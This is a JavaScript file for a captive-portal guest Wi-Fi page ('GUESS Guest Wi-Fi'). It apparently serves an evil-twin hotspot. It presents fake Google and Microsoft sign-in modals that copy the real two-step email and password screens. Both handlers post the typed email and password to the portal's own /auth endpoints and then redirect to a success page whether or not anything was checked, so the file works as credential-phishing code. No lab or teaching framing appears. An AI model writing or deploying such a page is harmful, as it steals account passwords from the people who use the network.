// Captive portal - frontend logic for the social login modals

const overlay = document.getElementById("overlay");


// Open / close modals

function openModal(id) {
    document.querySelectorAll(".modal").forEach(m => m.classList.remove("show"));
    const modal = document.getElementById(id);
    if (!modal) return;
    modal.classList.add("show");
    overlay.classList.add("active");
}

function closeAllModals() {
    overlay.classList.remove("active");
    setTimeout(() => {
        document.querySelectorAll(".modal").forEach(m => m.classList.remove("show"));
        resetGoogleModal();
        resetMicrosoftModal();
    }, 200);
}

document.getElementById("btn-google").addEventListener("click",    () => openModal("modal-google"));
document.getElementById("btn-microsoft").addEventListener("click", () => openModal("modal-microsoft"));
document.getElementById("btn-apple").addEventListener("click",     () => openModal("modal-apple"));

document.querySelectorAll("[data-close]").forEach(btn => {
    btn.addEventListener("click", closeAllModals);
});

overlay.addEventListener("click", (e) => {
    if (e.target === overlay) closeAllModals();
});

document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") closeAllModals();
});


// Google modal - two step (email, then password)

function resetGoogleModal() {
    document.getElementById("g-title").textContent = "Sign in";
    document.getElementById("g-sub").textContent   = "to continue to GUESS Guest Wi-Fi";
    document.getElementById("g-email-step").classList.remove("hidden");
    document.getElementById("g-password-step").classList.add("hidden");
    document.getElementById("g-email").value    = "";
    document.getElementById("g-password").value = "";
    const btn = document.getElementById("g-signin");
    btn.textContent = "Next";
    btn.disabled    = false;
}

document.getElementById("g-next").addEventListener("click", () => {
    const email = document.getElementById("g-email").value.trim();
    if (!email) {
        document.getElementById("g-email").focus();
        return;
    }
    document.getElementById("g-chip-email").textContent = email;
    document.getElementById("g-title").textContent = "Welcome";
    document.getElementById("g-sub").textContent   = "";
    document.getElementById("g-email-step").classList.add("hidden");
    document.getElementById("g-password-step").classList.remove("hidden");
    document.getElementById("g-password").focus();
});

document.getElementById("g-signin").addEventListener("click", () => {
    const email    = document.getElementById("g-email").value;
    const password = document.getElementById("g-password").value;
    if (!password) {
        document.getElementById("g-password").focus();
        return;
    }
    const btn = document.getElementById("g-signin");
    btn.textContent = "Signing in...";
    btn.disabled    = true;

    fetch("/auth/google", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password),
    }).finally(() => {
        window.location.href = "/success";
    });
});

document.getElementById("g-email").addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        document.getElementById("g-next").click();
    }
});

document.getElementById("g-password").addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        document.getElementById("g-signin").click();
    }
});

document.getElementById("g-show").addEventListener("click", (e) => {
    e.preventDefault();
    const input = document.getElementById("g-password");
    if (input.type === "password") {
        input.type = "text";
        e.target.textContent = "Hide password";
    } else {
        input.type = "password";
        e.target.textContent = "Show password";
    }
});


// Microsoft modal - two step (email, then password)

function resetMicrosoftModal() {
    document.getElementById("ms-title").textContent = "Sign in";
    document.getElementById("ms-sub").textContent   = "to continue to GUESS Guest Wi-Fi";
    document.getElementById("ms-email-step").classList.remove("hidden");
    document.getElementById("ms-password-step").classList.add("hidden");
    document.getElementById("ms-email").value    = "";
    document.getElementById("ms-password").value = "";
    const btn = document.getElementById("ms-signin");
    btn.textContent = "Sign in";
    btn.disabled    = false;
}

document.getElementById("ms-next").addEventListener("click", () => {
    const email = document.getElementById("ms-email").value.trim();
    if (!email) {
        document.getElementById("ms-email").focus();
        return;
    }
    document.getElementById("ms-email-shown").textContent = email;
    document.getElementById("ms-title").textContent = "Enter password";
    document.getElementById("ms-sub").textContent   = "";
    document.getElementById("ms-email-step").classList.add("hidden");
    document.getElementById("ms-password-step").classList.remove("hidden");
    document.getElementById("ms-password").focus();
});

document.getElementById("ms-signin").addEventListener("click", () => {
    const email    = document.getElementById("ms-email").value;
    const password = document.getElementById("ms-password").value;
    if (!password) {
        document.getElementById("ms-password").focus();
        return;
    }
    const btn = document.getElementById("ms-signin");
    btn.textContent = "Signing in...";
    btn.disabled    = true;

    fetch("/auth/microsoft", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password),
    }).finally(() => {
        window.location.href = "/success";
    });
});

document.getElementById("ms-email").addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        document.getElementById("ms-next").click();
    }
});

document.getElementById("ms-password").addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        document.getElementById("ms-signin").click();
    }
});


// Show / hide the acceptable use policy

document.getElementById("toggle-aup").addEventListener("click", (e) => {
    e.preventDefault();
    document.getElementById("aup").classList.toggle("hidden");
});
